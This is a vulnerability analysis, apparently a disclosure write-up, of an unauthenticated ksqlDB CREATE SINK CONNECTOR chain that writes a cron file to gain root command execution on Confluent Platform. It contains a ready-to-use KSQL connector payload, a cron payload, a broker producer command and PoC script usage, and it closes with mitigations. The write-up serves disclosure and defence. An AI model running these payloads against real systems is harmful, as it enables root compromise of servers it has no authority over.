# Confluent Platform ksqlDB Unauthenticated CREATE SINK CONNECTOR to Root RCE — Technical Analysis

## Overview

Confluent Platform 7.9.1-ce runs six services in a KRaft (no ZooKeeper) deployment. In the default configuration, ksqlDB (8089), the Kafka broker (9092 PLAINTEXT, no SASL), Kafka Connect (8083), Schema Registry (8081), and REST Proxy (8082) all accept requests without authentication. An attacker submits a `CREATE SINK CONNECTOR` statement to ksqlDB's `POST /ksql` endpoint, creating a `FileStreamSinkConnector` with an attacker-controlled `file` path and `StringConverter`. The attacker then produces arbitrary bytes to the subscribed Kafka topic through the unauthenticated broker. The connector appends each message to the target file. Writing a cron line to `/etc/cron.d/` results in root command execution when crond runs. Dynamically verified with `uid=0(root)`.

- **Authentication required**: None (unauthenticated)
- **Preconditions**: Default config (no auth on ksqlDB/broker/Connect); network reachability to 8089 + 9092; crond running; ksqlDB/Connect as root
- **Affected versions**: 7.9.1-ce (Kafka 3.9.1); other versions with default unauthenticated config
- **Privilege**: root (dynamically verified `uid=0(root)`)

## Architecture

```
L1 external access: ksqlDB HTTP 8089, Kafka broker 9092 (PLAINTEXT), Connect 8083
L2 auth boundary: no authentication on any of the three services (default)
L3 ksqlDB: POST /ksql -> CREATE SINK CONNECTOR (proxy to Connect REST)
L4 Connect: creates FileStreamSinkConnector with attacker-controlled file path
L5 source: Kafka topic message bytes (produced via unauthenticated broker)
L6 sink: PrintStream writer appends message bytes to file (CWE-73, no path validation)
L7 exec: cron line in /etc/cron.d -> crond runs as root -> arbitrary command
```

## Authentication Boundary

| Service | Port | Auth (default) |
|---------|------|----------------|
| Kafka broker | 9092 | PLAINTEXT, no SASL (UNAUTH) |
| Kafka controller | 9093 | — |
| MDS | 18090 | — |
| Schema Registry | 8081 | UNAUTH |
| Kafka Connect | 8083 | UNAUTH |
| ksqlDB | 8089 | UNAUTH (no `ksql.authentication`) |
| REST Proxy | 8082 | UNAUTH |

ksqlDB `POST /ksql {"ksql":"SHOW TOPICS;"}` returns 200 + topic list without credentials, confirming the unauthenticated KSQL execution entry point.

## Stage 1: Sink Identification

ksqlDB `CREATE SINK CONNECTOR` creates a connector on the Connect cluster through an internal Connect REST client. The attacker controls the connector config's `file` parameter (output file path) and `value.converter`. `FileStreamSinkConnector` (`org.apache.kafka.connect.file.FileStreamSinkConnector` in `share/filestream-connectors/connect-file-7.9.1-ce.jar`) appends each subscribed-topic message to the `file` path:

```java
PrintStream writer = new PrintStream(new FileOutputStream(file, true));  // append
writer.println(new String(value));  // message bytes written directly
```

No path validation, no allowlist, no sandbox. Writable paths include `/etc/cron.d/`, `/root/.bashrc`, `/etc/ld.so.preload`.

## Stage 2: Source Identification

Source = Kafka topic message content. The attacker produces arbitrary bytes to a topic via the unauthenticated broker (9092 PLAINTEXT):

```bash
printf "* * * * * root id > /tmp/rce_final_proof.txt 2>&1\n" | \
  kafka-console-producer --bootstrap-server 127.0.0.1:9092 --topic rcefinal
```

The topic is subscribed by the sink connector (`topics=rcefinal`); messages flow verbatim into `file`.

## Stage 3: Data Flow

```
Attacker
  | ① HTTP POST /ksql {"ksql":"CREATE SINK CONNECTOR ... file=/etc/cron.d/evil value.converter=StringConverter"}
  v
ksqlDB 8089 (UNAUTH) --internal Connect REST proxy--> Connect 8083 (UNAUTH)
  |                                                     |
  | ② Kafka Produce (PLAINTEXT, no SASL)                | FileStreamSinkConnector
  |   topic=rcefinal, value="* * * * * root id>..."     | writes /etc/cron.d/evil
  v                                                     v
Kafka broker 9092 (UNAUTH)                         /etc/cron.d/evil (root:root)
  |                                                     |
  | ③ crond runs every minute                           |
  v                                                     v
topic rcefinal                                     ④ id > /tmp/rce_final_proof.txt
                                                          v
                                                     uid=0(root)  <- RCE achieved
```

**Key converter**: `value.converter=org.apache.kafka.connect.storage.StringConverter`. The default `JsonConverter` fails on non-JSON messages (task FAILED); `StringConverter` writes the message as a raw string, producing a clean cron line.

## Stage 4: Injection / Exploit Construction

**KSQL statement** (ksqlDB HTTP `POST /ksql`, single-quote escaping in WITH values):

```json
{
  "ksql": "CREATE SINK CONNECTOR IF NOT EXISTS rceconn WITH ('connector.class'='org.apache.kafka.connect.file.FileStreamSinkConnector', 'tasks.max'='1', 'topics'='rcefinal', 'file'='/etc/cron.d/rce_final', 'value.converter'='org.apache.kafka.connect.storage.StringConverter');"
}
```

**cron payload** (5 fields + user root + command):

```
* * * * * root id > /tmp/rce_final_proof.txt 2>&1
```

**Quoting pitfall**: the DELIMITED serialization path wraps single-column strings in double quotes (`"* * * * * root ..."`), which cron rejects. The console-producer path (raw bytes, no quotes) delivers a clean cron line.

## Dynamic Verification

### Reproduction 1 (manual)
- `CREATE SINK CONNECTOR cronconn2` (file=/etc/cron.d/ksql_rce, StringConverter) + console-producer cron line
- `/etc/cron.d/ksql_rce` written (root:root, 148 bytes) -> cron triggered
- `/tmp/ksql_rce_proof.txt` = `uid=0(root) gid=0(root) groups=0(root)` 

### Reproduction 2 (clean re-run)
- `CREATE SINK CONNECTOR rceconn` (file=/etc/cron.d/rce_final, StringConverter) + console-producer
- `/etc/cron.d/rce_final`: root:root, 50 bytes, content `* * * * * root id > /tmp/rce_final_proof.txt 2>&1` (no quotes, cron-valid)
- After 65s: `/tmp/rce_final_proof.txt` = `uid=0(root) gid=0(root) groups=0(root)`

### Reproduction 3 (PoC script)
- `python3 ksqldb_unauth_sink_connector_cron_rce.py 127.0.0.1 8089 9092 "id > /tmp/poc_test_proof.txt"`
- Script: create topic -> UNAUTH ksqlDB CREATE SINK CONNECTOR -> wait task RUNNING -> UNAUTH broker produce -> wait cron
- `/tmp/poc_test_proof.txt` = `uid=0(root) gid=0(root) groups=0(root)`

### Adversarial verification
- Falsification agent: CANDIDATE STANDS (0.82), 6-axis refutation failed
- Independent re-analysis agent: CONFIRMED (0.97), independently reproduced uid=0

## Stage 6: Reachability

- **ksqlDB 8089 UNAUTH**: `ksql.authentication` not configured; `POST /ksql` needs no credentials
- **broker 9092 UNAUTH PLAINTEXT**: default `listener.security.protocol.map=PLAINTEXT`, no SASL
- **Connect 8083 UNAUTH**: no auth by default (ksqlDB proxy creates connector without Connect credentials)
- **crond**: Linux default
- **Process privilege**: ksqlDB/Connect started as root in this deployment -> file write root:root -> cron root execution

No MITM dependency: all requests are inbound HTTP/Kafka.

## Differences from Known CVEs

- **CVE-2023-25194** (JNDI/JndiLoginModule): this vulnerability does not use JNDI; it is CREATE SINK CONNECTOR file write
- **CVE-2025-27817** (file:// URI file read): this is arbitrary file WRITE, not read
- **CONFSA-2026-04** (ksqlDB /test endpoint Janino RCE, fixed in 7.9.7): this goes through /ksql CREATE SINK CONNECTOR, not /test

## Mitigation

1. Enable ksqlDB authentication (`ksql.authentication` with Confluent RBAC / Basic / LDAP)
2. Enable SASL on the Kafka broker; disable unauthenticated PLAINTEXT listeners
3. Restrict Connect connector-class allowlist; disable `FileStreamSinkConnector` or sandbox file-write paths
4. Require admin privileges for ksqlDB `CREATE SOURCE/SINK CONNECTOR` statements
5. Add a path allowlist to `FileStreamSinkConnector`'s `file` parameter; forbid writes to system directories

## CWEs

- CWE-306 (Missing Authentication for Critical Function) - ksqlDB/broker/Connect default no-auth
- CWE-73 (External Control of File Name or Path) - connector file path
- CWE-78 (Improper Neutralization of Special Elements used in an OS Command) - cron command injection
